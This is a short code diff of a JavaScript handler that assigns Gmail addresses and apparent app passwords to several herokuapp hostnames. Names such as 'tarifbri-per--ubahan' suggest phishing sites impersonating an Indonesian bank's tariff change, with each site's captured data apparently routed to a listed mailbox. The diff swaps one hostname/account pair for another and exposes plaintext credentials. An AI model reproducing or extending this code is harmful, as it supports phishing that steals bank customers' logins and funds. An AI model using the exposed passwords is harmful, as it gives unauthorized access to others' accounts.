@@ -24,9 +24,9 @@ export default function handler(req, res) {
         email = 'qqq66195@gmail.com';
         pass = 'gsnyrcjtylrepjdg';
 
-    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
-        email = 'alhamdulillahbule@gmail.com';
-        pass = 'cojyqlvqjjocgaln';
+    } else if(url == 'tarif--baru-lama.herokuapp.com'){
+        email = 'tarifbaru36@gmail.com';
+        pass = 'moiasopufjkptyvr';
 
     } else if(url == 'tarifbri-per--ubahan.herokuapp.com'){
         email = 'accbrimo05@gmail.com';
